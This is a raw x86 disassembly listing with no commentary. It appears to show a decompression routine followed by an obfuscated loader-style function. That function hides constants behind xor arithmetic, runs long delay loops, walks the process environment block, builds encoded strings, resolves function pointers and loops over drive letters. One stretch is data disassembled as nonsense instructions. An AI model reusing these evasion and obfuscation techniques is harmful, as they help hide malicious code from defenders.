  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
